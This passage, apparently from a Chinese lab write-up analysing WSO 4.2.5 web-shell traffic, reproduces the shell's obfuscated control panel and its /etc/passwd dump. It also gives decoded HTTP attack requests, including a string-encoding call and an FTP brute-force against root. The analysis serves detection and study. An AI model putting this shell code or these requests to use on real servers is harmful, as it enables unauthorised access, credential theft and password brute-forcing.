		<html><head><meta http-equiv='Content-Type' content='text/html; charset=UTF-8'><title>192.168.182.143 - WSO 4.2.5</title>
	<style>
		body {background-color:#060A10; color:#e1e1e1; margin:0; font:normal 75% Arial, Helvetica, sans-serif; } canvas{ display: block; vertical-align: bottom;}
		#particles-js{width: 100%; height: 100px; background-color: #060a10; background-image: url(''); background-repeat: no-repeat; background-size: cover; background-position: 50% 50%;}
		body,td,th	{font:10pt tahoma,arial,verdana,sans-serif,Lucida Sans;margin:0;vertical-align:top;}
		table.info	{color:#C3C3C3;}
		table#toolsTbl {background-color: #060A10;}
		span,h1,a	{color:#fff !important;}
		span		{font-weight:bolder;}
		h1			{border-left:5px solid #2E6E9C;padding:2px 5px;font:14pt Verdana;background-color:#10151c;margin:0px;}
		div.content	{padding:5px;margin-left:5px;background-color:#060a10;}
		a			{text-decoration:none;}
		a:hover		{text-decoration:underline;}
		.tooltip::after {background:#0663D5;color:#FFF;content: attr(data-tooltip);margin-top:-50px;display:block;padding:6px 10px;position:absolute;visibility:hidden;}
		.tooltip:hover::after {opacity:1;visibility:visible;}
		.ml1		{border:1px solid #202832;padding:5px;margin:0;overflow:auto;}
		.bigarea	{min-width:100%;max-width:100%;height:400px;}
		input, textarea, select	{margin:0;color:#fff;background-color:#202832;border:none;font:9pt Courier New;outline:none;}
		label {position:relative}
		label:after {content:'<>';font:10px 'Consolas', monospace;color:#fff;-webkit-transform:rotate(90deg);-moz-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg);right:3px; top:3px;padding:0;position:absolute;pointer-events:none;}
		label:before {content:'';right:0; top:0;width:17px; height:17px;background:#202832;position:absolute;pointer-events:none;display:block;}
		form		{margin:0px;}
		#toolsTbl	{text-align:center;}
		#fak 		{background:none;}
		#fak td 	{padding:5px 0 0 0;}
		iframe		{border:1px solid #060a10;}
		.toolsInp	{width:300px}
		.main th	{text-align:left;background-color:#060a10;}
		.main tr:hover{background-color:#354252;}
		.main td, th{vertical-align:middle;}
		input[type='submit']{background-color:#2E6E9C;}
		input[type='button']{background-color:#2E6E9C;}
		input[type='submit']:hover{background-color:#56AD15;}
		input[type='button']:hover{background-color:#56AD15;}
		.l1			{background-color:#202832;}
		pre			{font:9pt Courier New;}
	</style>
	<script>
	    var c_ = '/var/www/html/webshell-master/php/wso/';
	    var a_ = 'SafeMode'
	    var charset_ = 'UTF-8';
	    var p1_ = '5';
	    var p2_ = '1001';
	    var p3_ = '1000';
	    var d = document;
		
		function encrypt(str,pwd){if(pwd==null||pwd.length<=0){return null;}str=base64_encode(str);pwd=base64_encode(pwd);var enc_chr='';var enc_str='';var i=0;while(i<str.length){for(var j=0;j<pwd.length;j++){enc_chr=str.charCodeAt(i)^pwd.charCodeAt(j);enc_str+=String.fromCharCode(enc_chr);i++;if(i>=str.length)break;}}return base64_encode(enc_str);}
		function utf8_encode(argString){var string=(argString+'');var utftext='',start,end,stringl=0;start=end=0;stringl=string.length;for(var n=0;n<stringl;n++){var c1=string.charCodeAt(n);var enc=null;if(c1<128){end++;}else if(c1>127&&c1<2048){enc=String.fromCharCode((c1>>6)|192)+String.fromCharCode((c1&63)|128);}else{enc=String.fromCharCode((c1>>12)|224)+String.fromCharCode(((c1>>6)&63)|128)+String.fromCharCode((c1&63)|128);}if(enc!==null){if(end>start){utftext+=string.slice(start,end);}utftext+=enc;start=end=n+1;}}if(end>start){utftext+=string.slice(start,stringl);}return utftext;}
		function base64_encode(data){var b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var o1,o2,o3,h1,h2,h3,h4,bits,i=0,ac=0,enc='',tmp_arr=[];if (!data){return data;}data=utf8_encode(data+'');do{o1=data.charCodeAt(i++);o2=data.charCodeAt(i++);o3=data.charCodeAt(i++);bits=o1<<16|o2<<8|o3;h1=bits>>18&0x3f;h2=bits>>12&0x3f;h3=bits>>6&0x3f;h4=bits&0x3f;tmp_arr[ac++]=b64.charAt(h1)+b64.charAt(h2)+b64.charAt(h3)+b64.charAt(h4);}while(i<data.length);enc=tmp_arr.join('');switch (data.length%3){case 1:enc=enc.slice(0,-2)+'==';break;case 2:enc=enc.slice(0,-1)+'=';break;}return enc;}
		function set(a,c,p1,p2,p3,charset) {
			if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
			if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
			if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
			if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
			if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
			d.mf.a.value = encrypt(d.mf.a.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.c.value = encrypt(d.mf.c.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.p1.value = encrypt(d.mf.p1.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.p2.value = encrypt(d.mf.p2.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.p3.value = encrypt(d.mf.p3.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
		}
		function g(a,c,p1,p2,p3,charset) {
			set(a,c,p1,p2,p3,charset);
			d.mf.submit();
		}
		function a(a,c,p1,p2,p3,charset) {
			set(a,c,p1,p2,p3,charset);
			var params = 'ajax=true';
			for(i=0;i<d.mf.elements.length;i++)
				params += '&'+d.mf.elements[i].name+'='+encodeURIComponent(d.mf.elements[i].value);
			sr('/webshell-master/php/wso/wso-4.2.5.php', params);
		}
		function sr(url, params) {
			if (window.XMLHttpRequest)
				req = new XMLHttpRequest();
			else if (window.ActiveXObject)
				req = new ActiveXObject('Microsoft.XMLHTTP');
	        if (req) {
	            req.onreadystatechange = processReqChange;
	            req.open('POST', url, true);
	            req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');
	            req.send(params);
	        }
		}
		function processReqChange() {
			if( (req.readyState == 4) )
				if(req.status == 200) {
					var reg = new RegExp("(\\d+)([\\S\\s]*)", 'm');
					var arr=reg.exec(req.responseText);
					eval(arr[2].substr(0, arr[1]));
				} else alert('Request error!');
		}
	</script>
	<head><body><div style='position:absolute;background-color:rgba(95, 110, 130, 0.3);width:100%;top:0;left:0;'>
	<form method=post name=mf style='display:none;'>
	<input type=hidden name=a>
	<input type=hidden name=c>
	<input type=hidden name=p1>
	<input type=hidden name=p2>
	<input type=hidden name=p3>
	<input type=hidden name=charset>
	</form><table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:</span></td><td><nobr>Linux ubuntu 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64 <a href="http://noreferer.de/?http://www.google.com/search?q=Linux+ubuntu+3.19.0-25-generic+%2326%7E14.04.1-Ubuntu+SMP+Fri+Jul+24+21%3A16%3A20+UTC+2015+x86_64" target="_blank">[ Google ]</a> <a href="http://noreferer.de/?http://www.exploit-db.com/search/?action=search&description=Linux+Kernel+3.19.0" target=_blank>[ Exploit-DB ]</a></nobr><br>33 ( www-data ) <span>Group:</span> 33 ( www-data )<br>5.5.9-1ubuntu4.19 <span>Safe mode:</span> <font color=#FFDB5F><b>OFF</b></font> <a href=# onclick="g('Php',null,null,'info')">[ phpinfo ]</a> <span>Datetime:</span> 2016-11-06 16:47:02<br>18.58 GB <span>Free:</span> 13.12 GB (70.61%)<br><a href='#' onclick='g("FilesMan","/")'>/</a><a href='#' onclick='g("FilesMan","/var/")'>var/</a><a href='#' onclick='g("FilesMan","/var/www/")'>www/</a><a href='#' onclick='g("FilesMan","/var/www/html/")'>html/</a><a href='#' onclick='g("FilesMan","/var/www/html/webshell-master/")'>webshell-master/</a><a href='#' onclick='g("FilesMan","/var/www/html/webshell-master/php/")'>php/</a><a href='#' onclick='g("FilesMan","/var/www/html/webshell-master/php/wso/")'>wso/</a> <font color=#FFDB5F><b>drwxrwxrwx</b></font> <a href=# onclick="g('FilesMan','/var/www/html/webshell-master/php/wso','','','')">[ home ]</a><br></td><td width=1 align=right><nobr><label><select onchange="g(null,null,null,null,null,this.value)"><option value="UTF-8" selected>UTF-8</option><option value="Windows-1251" >Windows-1251</option><option value="KOI8-R" >KOI8-R</option><option value="KOI8-U" >KOI8-U</option><option value="cp866" >cp866</option></select></label><br><span>Server IP:</span><br>192.168.182.143<br><span>Client IP:</span><br>192.168.182.1</nobr></td></tr></table><table style="background-color:#2E6E9C;" cellpadding=3 cellspacing=0 width=100%><tr><th>[ <a href="#" onclick="g('SecInfo',null,'','','')">Sec. Info</a> ]</th><th>[ <a href="#" onclick="g('FilesMan',null,'','','')">Files</a> ]</th><th>[ <a href="#" onclick="g('Console',null,'','','')">Console</a> ]</th><th>[ <a href="#" onclick="g('Infect',null,'','','')">Infect</a> ]</th><th>[ <a href="#" onclick="g('Sql',null,'','','')">Sql</a> ]</th><th>[ <a href="#" onclick="g('Php',null,'','','')">Php</a> ]</th><th>[ <a href="#" onclick="g('SafeMode',null,'','','')">Safe mode</a> ]</th><th>[ <a href="#" onclick="g('StringTools',null,'','','')">String tools</a> ]</th><th>[ <a href="#" onclick="g('Bruteforce',null,'','','')">Bruteforce</a> ]</th><th>[ <a href="#" onclick="g('Network',null,'','','')">Network</a> ]</th><th>[ <a href="#" onclick="g('Logout',null,'','','')">Logout</a> ]</th><th>[ <a href="#" onclick="g('SelfRemove',null,'','','')">Self remove</a> ]</th></tr></table><div><h1>Safe mode bypass</h1><div class=content><span>Copy (read file)</span><form onsubmit='g(null,null,"1",this.param.value);return false;'><input class="toolsInp" type=text name=param><input type=submit value="submit"></form><br><span>Glob (list dir)</span><form onsubmit='g(null,null,"2",this.param.value);return false;'><input class="toolsInp" type=text name=param><input type=submit value="submit"></form><br><span>Curl (read file)</span><form onsubmit='g(null,null,"3",this.param.value);return false;'><input class="toolsInp" type=text name=param><input type=submit value="submit"></form><br><span>Ini_restore (read file)</span><form onsubmit='g(null,null,"4",this.param.value);return false;'><input class="toolsInp" type=text name=param><input type=submit value="submit"></form><br><span>Posix_getpwuid ("Read" /etc/passwd)</span><table><form onsubmit='g(null,null,"5",this.param1.value,this.param2.value);return false;'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000></td></tr></table><input type=submit value="submit"></form><br><br><span>Imap_open (read file)</span><form onsubmit='g(null,null,"6",this.param.value);return false;'><input type=text name=param><input type=submit value="submit"></form><pre class="ml1" style="margin-top:5px" id="Output">root:x:0:0:root:/root:/bin/bash
	daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
	bin:x:2:2:bin:/bin:/usr/sbin/nologin
	sys:x:3:3:sys:/dev:/usr/sbin/nologin
	sync:x:4:65534:sync:/bin:/bin/sync
	games:x:5:60:games:/usr/games:/usr/sbin/nologin
	man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
	lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
	mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
	news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
	uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
	proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
	www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
	backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
	list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
	irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
	gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
	libuuid:x:100:101::/var/lib/libuuid:
	syslog:x:101:104::/home/syslog:/bin/false
	messagebus:x:102:106::/var/run/dbus:/bin/false
	usbmux:x:103:46:usbmux daemon,,,:/home/usbmux:/bin/false
	dnsmasq:x:104:65534:dnsmasq,,,:/var/lib/misc:/bin/false
	avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
	kernoops:x:106:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
	rtkit:x:107:114:RealtimeKit,,,:/proc:/bin/false
	saned:x:108:115::/home/saned:/bin/false
	whoopsie:x:109:116::/nonexistent:/bin/false
	speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
	avahi:x:111:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
	lightdm:x:112:118:Light Display Manager:/var/lib/lightdm:/bin/false
	colord:x:113:121:colord colour management daemon,,,:/var/lib/colord:/bin/false
	hplip:x:114:7:HPLIP system user,,,:/var/run/hplip:/bin/false
	pulse:x:115:122:PulseAudio daemon,,,:/var/run/pulse:/bin/false
	sshd:x:116:65534::/var/run/sshd:/usr/sbin/nologin
	mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false
	yaofei:x:1000:1000:ubuntu14.04,,,:/home/yaofei:/bin/bash
	</pre></div>
	</div>
	<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%>
		<tr>
			<td><form onsubmit="g(null,this.c.value,'');return false;"><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='/var/www/html/webshell-master/php/wso/'><input type=submit value='submit'></form></td>
			<td><form onsubmit="g('FilesTools',null,this.f.value);return false;"><span>Read file:</span><br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>
		</tr><tr>
			<td><form onsubmit="g('FilesMan',null,'mkdir',this.d.value);return false;"><span>Make dir:</span> <font color='#FFDB5F'>[ Writeable ]</font><br><input class='toolsInp' type=text name=d required><input type=submit value='submit'></form></td>
			<td><form onsubmit="g('FilesTools',null,this.f.value,'mkfile');return false;"><span>Make file:</span> <font color='#FFDB5F'>[ Writeable ]</font><br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>
		</tr><tr>
			<td><form onsubmit="g('Console',null,this.c.value);return false;"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='submit'></form></td>
			<td><form method='post' ENCTYPE='multipart/form-data'>
			<input type=hidden name=a value='FilesMan'>
			<input type=hidden name=c value='/var/www/html/webshell-master/php/wso/'>
			<input type=hidden name=p1 value='uploadFile'>
			<input type=hidden name=ne value=''>
			<input type=hidden name=charset value='UTF-8'>
			<span>Upload file:</span> <font color='#FFDB5F'>[ Writeable ]</font><br><input class='toolsInp' type=file name=f[]  multiple><input type=submit value='submit'></form><br  ></td>
		</tr></table></div>
		<!-- particles --> <div id='particles-js'></div><script src='http://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js'></script>
		<script>particlesJS('particles-js', {'particles':{'number':{'value':80,'density':{'enable':true,'value_area':800}},'color':{'value':'#ffffff'},'shape':{'type':'triangle','stroke':{'width':0,'color':'#000000'},'polygon':{'nb_sides':5},'image':{'src':'img/github.svg','width':100,'height':100}},'opacity':{'value':0.5,'random':true,'anim':{'enable':false,'speed':1,'opacity_min':0.1,'sync':false}},'size':{'value':3,'random':true,'anim':{'enable':false,'speed':40,'size_min':0.1,'sync':false}},'line_linked':{'enable':true,'distance':200,'color':'#ffffff','opacity':0.4,'width':1},'move':{'enable':true,'speed':1,'direction':'none','random':true,'straight':false,'out_mode':'out','bounce':false,'attract':{'enable':false,'rotateX':10000,'rotateY':10000}}},'interactivity':{'detect_on':'canvas','events':{'onhover':{'enable':true,'mode':'grab'},'onclick':{'enable':true,'mode':'repulse'},'resize':true},'modes':{'grab':{'distance':200,'line_linked':{'opacity':0.5}},'bubble':{'particles_nb':2}}},'retina_detect':true});</script>
		</body></html>

#### 4.7.2&emsp;数据包分析 ####
>请求数据包攻击载荷：<font color=red>a=D3YfWAMCdEYUPT1V&c=FncDXTo%2BfAMqSQseLzIYGDtxaEkDAyFPOD01QDsUaEYDNQBdFDUAQy4TC0oWdz1POy59DQ%3D%3D&p1=FBVkCA%3D%3D&p2=FwVkCA%3D%3D&p3=FxAYQhQWeA0%3D&charset=UTF-8</font>

>数据包载荷分析：通过解密函数对其进行解密可以得到攻击载荷为：a=SafeMode&c=/var/www/html/webshell-master/php/wso/&p1=5&p2=0&p3=1000&charset=UTF-8,通过查看页面可以知道p1=Posix_getpwuid ("Read" /etc/passwd)，所以该操作为查看etc目录下的passwd的文件，即虚拟机中的密码。

>响应数据包分析：该操作没有通过ajax的方式进行提交，所以返回时刷新整个页面，返回的数据也是整个页面。

>具体信息如图4.7.1所示：<br>![wso_shell]({{ site.baseurl }}/images/wso_shell/etc_passwd.png)<br><center>图4.7.1</center>

### 4.8&emsp;字符串编码解码操作 ###
#### 4.8.1&emsp;数据包内容 ####
**请求数据包**
<br>

	POST /webshell-master/php/wso/wso-4.2.5.php HTTP/1.1
	Host: 192.168.182.143
	Connection: keep-alive
	Content-Length: 205
	Origin: http://192.168.182.143
	User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
	Content-Type: application/x-www-form-urlencoded
	Accept: */*
	Referer: http://192.168.182.143/webshell-master/php/wso/wso-4.2.5.php
	Accept-Encoding: gzip, deflate
	Accept-Language: zh-CN,zh;q=0.8
	Cookie: da94407ecf64bda7c0ac6ea1fa4477d8key=d69aa478a72ecd3a99c77af6fcf6b917; da94407ecf64bda7c0ac6ea1fa4477d8=21232f297a57a5a743894a0e4a801fc3
	
	ajax=true&a=D3cLTDgAcF4YPVEeLDIHUQ%3D%3D&c=FncDXTo%2BfAMqSQseLzIYGDtxaEkDAyFPOD01QDsUaEYDNQBdFDUAQy4TC0oWdz1POy59DQ%3D%3D&p1=AykfTwMDHAAWSD4dF0hzBwNjbEc%3D&p2=OwMPRjsQfVcqSFERLD0bUQ%3D%3D&p3=&charset=UTF-8

**响应数据包**
<br>

	HTTP/1.1 200 OK
	Date: Mon, 07 Nov 2016 01:16:03 GMT
	Server: Apache/2.4.7 (Ubuntu)
	X-Powered-By: PHP/5.5.9-1ubuntu4.19
	Set-Cookie: da94407ecf64bda7c0ac6ea1fa4477d8ajax=1
	Vary: Accept-Encoding
	Content-Encoding: gzip
	Content-Length: 108
	Keep-Alive: timeout=5, max=100
	Connection: Keep-Alive
	Content-Type: text/html
	
	121
	document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='aGVsbG8gd29ybGQ=';

#### 4.8.2&emsp;数据包分析 ####
>请求数据包攻击载荷：<font color=red>ajax=true&a=D3cLTDgAcF4YPVEeLDIHUQ%3D%3D&c=FncDXTo%2BfAMqSQseLzIYGDtxaEkDAyFPOD01QDsUaEYDNQBdFDUAQy4TC0oWdz1POy59DQ%3D%3D&p1=AykfTwMDHAAWSD4dF0hzBwNjbEc%3D&p2=OwMPRjsQfVcqSFERLD0bUQ%3D%3D&p3=&charset=UTF-8</font>

>数据包载荷分析：通过解密函数解密后的载荷为：ajax=true&a=StringTools&c=/var/www/html/webshell-master/php/wso/&p1=base64_encode&p2=hello world&p3=&charset=UTF-8，通过载荷分析可知页面提交方式为ajax，操作为base64_encode，编码字符串为hello world。

>响应包具体分析：该响应包进行ajax提交方式,数据包数据只返回相应的结果数据，观察相应数据后发现，该输出框通过js脚本document.getElementById('strOutput').innerHTML获得页面内容。

>具体信息如图4.8.1所示：<br>![wso_shell]({{ site.baseurl }}/images/wso_shell/encode_str.png)<br><center>图4.8.1</center>

### 4.9&emsp;暴力破解 ###
#### 4.9.1&emsp;数据包内容 ####
**请求数据包**
<br>

	POST /webshell-master/php/wso/wso-4.2.5.php HTTP/1.1
	Host: 192.168.182.143
	Connection: keep-alive
	Content-Length: 208
	Cache-Control: max-age=0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
	Origin: http://192.168.182.143
	Upgrade-Insecure-Requests: 1
	User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
	Content-Type: application/x-www-form-urlencoded
	Referer: http://192.168.182.143/webshell-master/php/wso/wso-4.2.5.php
	Accept-Encoding: gzip, deflate
	Accept-Language: zh-CN,zh;q=0.8
	Cookie: da94407ecf64bda7c0ac6ea1fa4477d8key=d69aa478a72ecd3a99c77af6fcf6b917; da94407ecf64bda7c0ac6ea1fa4477d8=21232f297a57a5a743894a0e4a801fc3; da94407ecf64bda7c0ac6ea1fa4477d8ajax=1
	
	proto=ftp&c=%2Fvar%2Fwww%2Fhtml%2Fwebshell-master%2Fphp%2Fwso%2F&a=Bruteforce&charset=UTF-8&ne=&server=127.0.0.1&type=1&reverse=1&login=root&dict=%2Fvar%2Fwww%2Fhtml%2Fwebshell-master%2Fphp%2Fwso%2Fpasswd.dic

**响应数据包**
<br>

	HTTP/1.1 200 OK
	Date: Mon, 07 Nov 2016 01:24:52 GMT
	Server: Apache/2.4.7 (Ubuntu)
	X-Powered-By: PHP/5.5.9-1ubuntu4.19
	Vary: Accept-Encoding
	Content-Encoding: gzip
	Content-Length: 4573
	Keep-Alive: timeout=5, max=100
	Connection: Keep-Alive
	Content-Type: text/html
	
	<html><head><meta http-equiv='Content-Type' content='text/html; charset=UTF-8'><title>192.168.182.143 - WSO 4.2.5</title>
	<style>
		body {background-color:#060A10; color:#e1e1e1; margin:0; font:normal 75% Arial, Helvetica, sans-serif; } canvas{ display: block; vertical-align: bottom;}
		#particles-js{width: 100%; height: 100px; background-color: #060a10; background-image: url(''); background-repeat: no-repeat; background-size: cover; background-position: 50% 50%;}
		body,td,th	{font:10pt tahoma,arial,verdana,sans-serif,Lucida Sans;margin:0;vertical-align:top;}
		table.info	{color:#C3C3C3;}
		table#toolsTbl {background-color: #060A10;}
		span,h1,a	{color:#fff !important;}
		span		{font-weight:bolder;}
		h1			{border-left:5px solid #2E6E9C;padding:2px 5px;font:14pt Verdana;background-color:#10151c;margin:0px;}
		div.content	{padding:5px;margin-left:5px;background-color:#060a10;}
		a			{text-decoration:none;}
		a:hover		{text-decoration:underline;}
		.tooltip::after {background:#0663D5;color:#FFF;content: attr(data-tooltip);margin-top:-50px;display:block;padding:6px 10px;position:absolute;visibility:hidden;}
		.tooltip:hover::after {opacity:1;visibility:visible;}
		.ml1		{border:1px solid #202832;padding:5px;margin:0;overflow:auto;}
		.bigarea	{min-width:100%;max-width:100%;height:400px;}
		input, textarea, select	{margin:0;color:#fff;background-color:#202832;border:none;font:9pt Courier New;outline:none;}
		label {position:relative}
		label:after {content:'<>';font:10px 'Consolas', monospace;color:#fff;-webkit-transform:rotate(90deg);-moz-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg);right:3px; top:3px;padding:0;position:absolute;pointer-events:none;}
		label:before {content:'';right:0; top:0;width:17px; height:17px;background:#202832;position:absolute;pointer-events:none;display:block;}
		form		{margin:0px;}
		#toolsTbl	{text-align:center;}
		#fak 		{background:none;}
		#fak td 	{padding:5px 0 0 0;}
		iframe		{border:1px solid #060a10;}
		.toolsInp	{width:300px}
		.main th	{text-align:left;background-color:#060a10;}
		.main tr:hover{background-color:#354252;}
		.main td, th{vertical-align:middle;}
		input[type='submit']{background-color:#2E6E9C;}
		input[type='button']{background-color:#2E6E9C;}
		input[type='submit']:hover{background-color:#56AD15;}
		input[type='button']:hover{background-color:#56AD15;}
		.l1			{background-color:#202832;}
		pre			{font:9pt Courier New;}
	</style>
	<script>
	    var c_ = '/var/www/html/webshell-master/php/wso/';
	    var a_ = 'Bruteforce'
	    var charset_ = 'UTF-8';
	    var p1_ = '';
	    var p2_ = '';
	    var p3_ = '';
	    var d = document;
		
		function encrypt(str,pwd){if(pwd==null||pwd.length<=0){return null;}str=base64_encode(str);pwd=base64_encode(pwd);var enc_chr='';var enc_str='';var i=0;while(i<str.length){for(var j=0;j<pwd.length;j++){enc_chr=str.charCodeAt(i)^pwd.charCodeAt(j);enc_str+=String.fromCharCode(enc_chr);i++;if(i>=str.length)break;}}return base64_encode(enc_str);}
		function utf8_encode(argString){var string=(argString+'');var utftext='',start,end,stringl=0;start=end=0;stringl=string.length;for(var n=0;n<stringl;n++){var c1=string.charCodeAt(n);var enc=null;if(c1<128){end++;}else if(c1>127&&c1<2048){enc=String.fromCharCode((c1>>6)|192)+String.fromCharCode((c1&63)|128);}else{enc=String.fromCharCode((c1>>12)|224)+String.fromCharCode(((c1>>6)&63)|128)+String.fromCharCode((c1&63)|128);}if(enc!==null){if(end>start){utftext+=string.slice(start,end);}utftext+=enc;start=end=n+1;}}if(end>start){utftext+=string.slice(start,stringl);}return utftext;}
		function base64_encode(data){var b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var o1,o2,o3,h1,h2,h3,h4,bits,i=0,ac=0,enc='',tmp_arr=[];if (!data){return data;}data=utf8_encode(data+'');do{o1=data.charCodeAt(i++);o2=data.charCodeAt(i++);o3=data.charCodeAt(i++);bits=o1<<16|o2<<8|o3;h1=bits>>18&0x3f;h2=bits>>12&0x3f;h3=bits>>6&0x3f;h4=bits&0x3f;tmp_arr[ac++]=b64.charAt(h1)+b64.charAt(h2)+b64.charAt(h3)+b64.charAt(h4);}while(i<data.length);enc=tmp_arr.join('');switch (data.length%3){case 1:enc=enc.slice(0,-2)+'==';break;case 2:enc=enc.slice(0,-1)+'=';break;}return enc;}
		function set(a,c,p1,p2,p3,charset) {
			if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
			if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
			if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
			if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
			if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
			d.mf.a.value = encrypt(d.mf.a.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.c.value = encrypt(d.mf.c.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.p1.value = encrypt(d.mf.p1.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.p2.value = encrypt(d.mf.p2.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.p3.value = encrypt(d.mf.p3.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
		}
		function g(a,c,p1,p2,p3,charset) {
			set(a,c,p1,p2,p3,charset);
			d.mf.submit();
		}
		function a(a,c,p1,p2,p3,charset) {
			set(a,c,p1,p2,p3,charset);
			var params = 'ajax=true';
			for(i=0;i<d.mf.elements.length;i++)
				params += '&'+d.mf.elements[i].name+'='+encodeURIComponent(d.mf.elements[i].value);
			sr('/webshell-master/php/wso/wso-4.2.5.php', params);
		}
		function sr(url, params) {
			if (window.XMLHttpRequest)
				req = new XMLHttpRequest();
			else if (window.ActiveXObject)
				req = new ActiveXObject('Microsoft.XMLHTTP');
	        if (req) {
	            req.onreadystatechange = processReqChange;
	            req.open('POST', url, true);
	            req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');
	            req.send(params);
	        }
		}
		function processReqChange() {
			if( (req.readyState == 4) )
				if(req.status == 200) {
					var reg = new RegExp("(\\d+)([\\S\\s]*)", 'm');
					var arr=reg.exec(req.responseText);
					eval(arr[2].substr(0, arr[1]));
				} else alert('Request error!');
		}
	</script>
	<head><body><div style='position:absolute;background-color:rgba(95, 110, 130, 0.3);width:100%;top:0;left:0;'>
	<form method=post name=mf style='display:none;'>
	<input type=hidden name=a>
	<input type=hidden name=c>
	<input type=hidden name=p1>
	<input type=hidden name=p2>
	<input type=hidden name=p3>
	<input type=hidden name=charset>
	</form><table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:</span></td><td><nobr>Linux ubuntu 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64 <a href="http://noreferer.de/?http://www.google.com/search?q=Linux+ubuntu+3.19.0-25-generic+%2326%7E14.04.1-Ubuntu+SMP+Fri+Jul+24+21%3A16%3A20+UTC+2015+x86_64" target="_blank">[ Google ]</a> <a href="http://noreferer.de/?http://www.exploit-db.com/search/?action=search&description=Linux+Kernel+3.19.0" target=_blank>[ Exploit-DB ]</a></nobr><br>33 ( www-data ) <span>Group:</span> 33 ( www-data )<br>5.5.9-1ubuntu4.19 <span>Safe mode:</span> <font color=#FFDB5F><b>OFF</b></font> <a href=# onclick="g('Php',null,null,'info')">[ phpinfo ]</a> <span>Datetime:</span> 2016-11-06 17:24:52<br>18.58 GB <span>Free:</span> 13.12 GB (70.61%)<br><a href='#' onclick='g("FilesMan","/")'>/</a><a href='#' onclick='g("FilesMan","/var/")'>var/</a><a href='#' onclick='g("FilesMan","/var/www/")'>www/</a><a href='#' onclick='g("FilesMan","/var/www/html/")'>html/</a><a href='#' onclick='g("FilesMan","/var/www/html/webshell-master/")'>webshell-master/</a><a href='#' onclick='g("FilesMan","/var/www/html/webshell-master/php/")'>php/</a><a href='#' onclick='g("FilesMan","/var/www/html/webshell-master/php/wso/")'>wso/</a> <font color=#FFDB5F><b>drwxrwxrwx</b></font> <a href=# onclick="g('FilesMan','/var/www/html/webshell-master/php/wso','','','')">[ home ]</a><br></td><td width=1 align=right><nobr><label><select onchange="g(null,null,null,null,null,this.value)"><option value="UTF-8" selected>UTF-8</option><option value="Windows-1251" >Windows-1251</option><option value="KOI8-R" >KOI8-R</option><option value="KOI8-U" >KOI8-U</option><option value="cp866" >cp866</option></select></label><br><span>Server IP:</span><br>192.168.182.143<br><span>Client 